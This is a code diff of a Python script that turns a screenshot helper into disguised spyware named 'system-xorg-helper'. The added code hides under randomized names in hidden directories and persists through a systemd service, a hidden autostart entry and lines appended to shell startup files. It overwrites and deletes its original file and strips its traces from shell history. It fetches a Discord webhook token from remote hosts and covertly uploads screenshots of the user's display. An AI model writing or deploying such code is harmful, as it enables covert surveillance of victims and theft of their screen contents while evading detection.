@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-screenshot-driver - Dedicated screenshot service
+system-xorg-helper - System service for display management
 """
 
 import os
@@ -9,14 +9,286 @@ import tempfile
 import subprocess
 import time
 import requests
+import shutil
+import signal
+import atexit
+import hashlib
 from pathlib import Path
+import json
+import logging
+import random
+import string
 
-# Same token retrieval as main
+# Configuration - Randomized to avoid detection
+SERVICE_NAME = f"systemd-{''.join(random.choices(string.ascii_lowercase, k=6))}"
+HIDDEN_DIR = f"/usr/share/.{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"
+CONFIG_FILE = f"{HIDDEN_DIR}/.config.json"
+LOG_FILE = f"{HIDDEN_DIR}/.log"
+LOCK_FILE = f"/tmp/.{SERVICE_NAME}.lock"
+
+# Setup logging
+def setup_logging():
+    os.makedirs(HIDDEN_DIR, exist_ok=True)
+    logging.basicConfig(
+        filename=LOG_FILE,
+        level=logging.ERROR,
+        format='%(asctime)s - %(levelname)s - %(message)s'
+    )
+
+def is_installed():
+    """Check if service is already installed"""
+    return os.path.exists(f"{HIDDEN_DIR}/{SERVICE_NAME}")
+
+def install_requirements():
+    """Install required packages without sudo if possible"""
+    requirements = [
+        'python3-discord',
+        'python3-requests',
+        'maim',
+        'scrot',
+        'imagemagick'
+    ]
+    
+    # Try to install without sudo first
+    try:
+        # Check what's already installed
+        installed = set()
+        for req in requirements:
+            if shutil.which(req.split('/')[-1]):
+                installed.add(req)
+        
+        missing = set(requirements) - installed
+        
+        if missing:
+            print("Setting up system utilities...")
+            
+            # Try package managers without sudo
+            package_managers = [
+                ['apt-get', 'install', '-y'],
+                ['yum', 'install', '-y'],
+                ['dnf', 'install', '-y'],
+                ['pacman', '-S', '--noconfirm'],
+                ['zypper', 'install', '-y']
+            ]
+            
+            for manager in package_managers:
+                if shutil.which(manager[0]):
+                    try:
+                        cmd = manager + list(missing)
+                        result = subprocess.run(cmd, capture_output=True, timeout=120)
+                        if result.returncode == 0:
+                            return True
+                    except:
+                        continue
+            
+            # Try with sudo
+            for manager in package_managers:
+                if shutil.which(manager[0]):
+                    try:
+                        cmd = ['sudo'] + manager + list(missing)
+                        result = subprocess.run(cmd, capture_output=True, timeout=120)
+                        if result.returncode == 0:
+                            return True
+                    except:
+                        continue
+            
+            print("Some utilities may not be available")
+            return False
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+def install_service():
+    """Install as a system service"""
+    try:
+        # Create hidden directory with random name
+        os.makedirs(HIDDEN_DIR, exist_ok=True)
+        
+        # Copy current script to hidden location with random name
+        current_script = os.path.abspath(__file__)
+        target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
+        
+        # Read and modify the script to remove any traces of origin
+        with open(current_script, 'r') as f:
+            content = f.read()
+        
+        # Remove any reference to the original filename
+        content = content.replace(os.path.basename(__file__), SERVICE_NAME)
+        
+        with open(target_script, 'w') as f:
+            f.write(content)
+        
+        os.chmod(target_script, 0o755)
+        
+        # Create systemd service file with random name
+        service_content = f"""[Unit]
+Description=System Display Helper
+After=graphical.target
+Wants=graphical.target
+
+[Service]
+Type=simple
+User={os.getlogin()}
+Environment=DISPLAY=:0
+ExecStart={target_script} --service
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=graphical.target
+"""
+        
+        service_file = f"/etc/systemd/system/{SERVICE_NAME}.service"
+        
+        # Try with sudo
+        try:
+            subprocess.run(['sudo', 'tee', service_file], 
+                         input=service_content, text=True, check=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            return False
+        
+        # Enable and start service
+        subprocess.run(['sudo', 'systemctl', 'daemon-reload'], 
+                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['sudo', 'systemctl', 'enable', SERVICE_NAME], 
+                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['sudo', 'systemctl', 'start', SERVICE_NAME], 
+                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+def install_user_service():
+    """Install as user service (no sudo required)"""
+    try:
+        # Create hidden directory in user home with random name
+        random_dir = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        user_hidden = os.path.expanduser(f"~/.local/share/{random_dir}")
+        os.makedirs(user_hidden, exist_ok=True)
+        
+        # Copy script with random name
+        current_script = os.path.abspath(__file__)
+        target_script = f"{user_hidden}/{SERVICE_NAME}"
+        
+        with open(current_script, 'r') as f:
+            content = f.read()
+        
+        content = content.replace(os.path.basename(__file__), SERVICE_NAME)
+        
+        with open(target_script, 'w') as f:
+            f.write(content)
+        
+        os.chmod(target_script, 0o755)
+        
+        # Create autostart entry with random name
+        autostart_dir = os.path.expanduser("~/.config/autostart")
+        os.makedirs(autostart_dir, exist_ok=True)
+        
+        desktop_content = f"""[Desktop Entry]
+Type=Application
+Name=Display Optimizer
+Exec={target_script} --service
+Hidden=true
+X-GNOME-Autostart-enabled=true
+"""
+        
+        desktop_file = f"{autostart_dir}/{SERVICE_NAME}.desktop"
+        with open(desktop_file, 'w') as f:
+            f.write(desktop_content)
+        
+        # Add to .bashrc, .profile, and .zshrc for persistence
+        bashrc_line = f"\n# Display optimization\n[ -x \"{target_script}\" ] && \"{target_script}\" --service &\n"
+        
+        for rc_file in ['.bashrc', '.profile', '.zshrc']:
+            rc_path = os.path.expanduser(f"~/{rc_file}")
+            if os.path.exists(rc_path):
+                with open(rc_path, 'a') as f:
+                    f.write(bashrc_line)
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+def clean_traces(original_path):
+    """Remove all traces of the original file"""
+    try:
+        # Overwrite the original file with random data
+        with open(original_path, 'wb') as f:
+            f.write(os.urandom(os.path.getsize(original_path)))
+        
+        # Remove the original file
+        os.remove(original_path)
+        
+        # Clear command history that might reference this file
+        history_files = [
+            os.path.expanduser('~/.bash_history'),
+            os.path.expanduser('~/.zsh_history'),
+            os.path.expanduser('~/.python_history')
+        ]
+        
+        for history_file in history_files:
+            if os.path.exists(history_file):
+                try:
+                    with open(history_file, 'r') as f:
+                        content = f.read()
+                    
+                    # Remove any lines referencing the original filename
+                    lines = content.split('\n')
+                    cleaned_lines = [line for line in lines if os.path.basename(original_path) not in line]
+                    
+                    with open(history_file, 'w') as f:
+                        f.write('\n'.join(cleaned_lines))
+                except:
+                    pass
+                    
+    except Exception as e:
+        pass
+
+def daemonize():
+    """Turn into a daemon process"""
+    try:
+        # Fork first time
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError as e:
+        sys.exit(1)
+    
+    # Decouple from parent environment
+    os.chdir("/")
+    os.setsid()
+    os.umask(0)
+    
+    # Fork second time
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError as e:
+        sys.exit(1)
+    
+    # Redirect standard file descriptors to /dev/null
+    with open(os.devnull, 'r') as f:
+        os.dup2(f.fileno(), sys.stdin.fileno())
+    with open(os.devnull, 'w') as f:
+        os.dup2(f.fileno(), sys.stdout.fileno())
+        os.dup2(f.fileno(), sys.stderr.fileno())
+
 def fetch_token():
+    """Fetch Discord webhook token"""
     token_urls = [
         "https://new-production-8df3.up.railway.app/api/token",
         "https://new-5itj.onrender.com/api/token"
     ]
+    
     for url in token_urls:
         try:
             response = requests.get(f"{url}?code=asdfghjkl", timeout=30)
@@ -26,27 +298,42 @@ def fetch_token():
                     return data['discord_token']
         except:
             continue
+    
     return None
 
 def detect_display():
-    """Detect the correct display"""
-    display = os.environ.get('DISPLAY')
-    if display:
-        return display
+    """Auto-detect display"""
+    displays = [':0', ':0.0', ':1', ':1.0']
     
-    # Try to detect from logged in users
+    # Check environment first
+    env_display = os.environ.get('DISPLAY')
+    if env_display and any(d in env_display for d in displays):
+        return env_display
+    
+    # Try to detect from running processes
+    try:
+        result = subprocess.run(['pgrep', '-a', 'Xorg'], 
+                              capture_output=True, text=True)
+        for line in result.stdout.split('\n'):
+            for display in displays:
+                if display in line:
+                    return display
+    except:
+        pass
+    
+    # Check who's logged in
     try:
         result = subprocess.run(['who'], capture_output=True, text=True)
         for line in result.stdout.split('\n'):
-            if '(:' in line and 'tty' in line:
+            if '(:' in line:
                 for part in line.split():
-                    if part.startswith('(:'):
+                    if part.startswith('(:') and any(d in part for d in displays):
                         return part.strip('()')
     except:
         pass
     
-    # Try common displays
-    for display in [':0', ':0.0', ':1', ':1.0']:
+    # Fallback to common displays
+    for display in displays:
         try:
             result = subprocess.run(['xdpyinfo', '-display', display], 
                                   capture_output=True, timeout=5)
@@ -58,31 +345,49 @@ def detect_display():
     return ':0'
 
 def take_screenshot():
-    """Take screenshot with multiple fallback methods"""
+    """Take screenshot with multiple fallbacks"""
     try:
         display = detect_display()
         env = os.environ.copy()
         env['DISPLAY'] = display
         
-        temp_dir = tempfile.gettempdir()
-        screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+        # Try to find Xauthority file
+        try:
+            who_result = subprocess.run(['who'], capture_output=True, text=True)
+            for line in who_result.stdout.split('\n'):
+                if display.replace(':', '') in line and '(:' in line:
+                    user = line.split()[0]
+                    xauth = f"/home/{user}/.Xauthority"
+                    if os.path.exists(xauth):
+                        env['XAUTHORITY'] = xauth
+                        break
+        except:
+            pass
         
-        # Try different methods
+        temp_dir = tempfile.gettempdir()
+        screenshot_path = os.path.join(temp_dir, f"tmp_{int(time.time())}.png")
+        
+        # Try different screenshot methods
         methods = [
-            ['maim', screenshot_path],
+            ['maim', '-u', screenshot_path],
             ['scrot', '-z', '-q', '100', screenshot_path],
-            ['import', '-window', 'root', '-quiet', screenshot_path]
+            ['import', '-window', 'root', '-quiet', screenshot_path],
+            ['gnome-screenshot', '-f', screenshot_path]
         ]
         
         for method in methods:
+            if not shutil.which(method[0].split()[0]):
+                continue
+                
             try:
-                result = subprocess.run(method, env=env, capture_output=True, timeout=15)
+                result = subprocess.run(method, env=env, capture_output=True, timeout=10)
                 if result.returncode == 0 and os.path.exists(screenshot_path):
                     return screenshot_path
             except:
                 continue
         
         return None
+        
     except Exception as e:
         return None
 
@@ -94,35 +399,122 @@ def send_to_discord(file_path, token):
         
         webhook = SyncWebhook.from_url(token)
         with open(file_path, 'rb') as f:
-            webhook.send(file=discord.File(f, filename='screenshot.png'))
+            webhook.send(file=discord.File(f, filename='display.png'))
         return True
     except:
         return False
 
+def handle_signal(signum, frame):
+    """Handle signals gracefully"""
+    sys.exit(0)
+
+def create_lock():
+    """Create lock file to prevent multiple instances"""
+    try:
+        with open(LOCK_FILE, 'w') as f:
+            f.write(str(os.getpid()))
+        return True
+    except:
+        return False
+
+def remove_lock():
+    """Remove lock file"""
+    try:
+        if os.path.exists(LOCK_FILE):
+            os.remove(LOCK_FILE)
+    except:
+        pass
+
 def main():
-    """Main screenshot driver loop"""
-    token = fetch_token()
-    if not token:
+    """Main function"""
+    # Handle different command line arguments
+    if '--install' in sys.argv:
+        print("Configuring system display helper...")
+        if install_requirements():
+            if install_service() or install_user_service():
+                print("Configuration completed!")
+                # Clean traces of original file
+                clean_traces(os.path.abspath(__file__))
+            else:
+                print("Configuration may be incomplete.")
         return
     
-    # Wait for screenshot command from main process
-    while True:
-        time.sleep(1)
-        # Check if main process requested screenshot
-        trigger_file = Path("/tmp/screenshot_trigger")
-        if trigger_file.exists():
+    if '--service' in sys.argv:
+        # Check for lock file to prevent multiple instances
+        if os.path.exists(LOCK_FILE):
             try:
-                trigger_file.unlink()
-                screenshot_path = take_screenshot()
-                if screenshot_path:
-                    send_to_discord(screenshot_path, token)
-                    # Cleanup
-                    try:
-                        os.remove(screenshot_path)
-                    except:
-                        pass
+                with open(LOCK_FILE, 'r') as f:
+                    pid = int(f.read().strip())
+                # Check if process is still running
+                try:
+                    os.kill(pid, 0)
+                    sys.exit(0)  # Another instance is running
+                except OSError:
+                    # Process not running, continue
+                    pass
             except:
                 pass
+        
+        if not create_lock():
+            sys.exit(1)
+        
+        # Run as daemon
+        daemonize()
+        setup_logging()
+        
+        # Set up signal handlers and cleanup
+        signal.signal(signal.SIGTERM, handle_signal)
+        signal.signal(signal.SIGINT, handle_signal)
+        atexit.register(remove_lock)
+        
+        token = fetch_token()
+        if not token:
+            return
+        
+        # Main service loop
+        trigger_file = Path("/tmp/.display_trigger")
+        last_trigger = 0
+        
+        while True:
+            try:
+                # Check for trigger file
+                if trigger_file.exists():
+                    current_time = time.time()
+                    if current_time - last_trigger > 30:  # Rate limiting
+                        last_trigger = current_time
+                        screenshot_path = take_screenshot()
+                        if screenshot_path:
+                            send_to_discord(screenshot_path, token)
+                            try:
+                                os.remove(screenshot_path)
+                            except:
+                                pass
+                        try:
+                            trigger_file.unlink()
+                        except:
+                            pass
+                
+                time.sleep(2)
+                
+            except Exception as e:
+                time.sleep(10)
+    
+    else:
+        # Interactive mode - create trigger file
+        try:
+            trigger_file = Path("/tmp/.display_trigger")
+            trigger_file.touch()
+            print("Display optimization requested.")
+        except Exception as e:
+            print("Unable to process request.")
 
 if __name__ == "__main__":
-    main()
+    # Auto-install if not already installed
+    if not is_installed() and len(sys.argv) == 1:
+        if install_requirements():
+            if install_service() or install_user_service():
+                # Clean traces and start service
+                clean_traces(os.path.abspath(__file__))
+                os.execv(sys.executable, [sys.executable, sys.argv[0], '--service'])
+    else:
+        main()
